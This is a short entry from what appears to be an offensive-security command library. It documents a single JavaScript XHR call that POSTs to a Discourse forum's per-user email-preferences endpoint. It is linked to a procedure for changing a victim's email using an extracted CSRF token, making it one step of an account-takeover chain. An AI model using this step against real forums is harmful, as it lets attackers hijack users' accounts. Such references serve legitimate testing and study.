---
data: >-
  xhr.open("POST", "https://discourse.instance.behind.cloudflare.proxy/users/" +
  user + "/preferences/email.json", true);
tags:
  - javascript
  - xhr
type: command
executor: javascript
platforms:
  - Web
id: 63dfb474-ce14-46c9-b7c4-7004bee007d4
created_at: '2025-12-13T09:00:34.457Z'
updated_at: '2025-12-13T09:00:34.457Z'
verified: false
validated: true
submitted: true
---
# XHR Open POST Email Change

## Command

```javascript
xhr.open("POST", "https://discourse.instance.behind.cloudflare.proxy/users/" + user + "/preferences/email.json", true);
```

## Description

Initializes a POST request to change the email.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | /users/$username/preferences/email.json | Yes |
| `async` | true | Yes |
| `method` | POST | Yes |

## Examples

### Basic Usage

```javascript
xhr.open("POST", "https://example.com/users/user/preferences/email.json", true);
```

## Expected Output

N/A (asynchronous request)

## Related

- [[procedures/Change-Victim-Email-Using-Extracted-CSRF]]
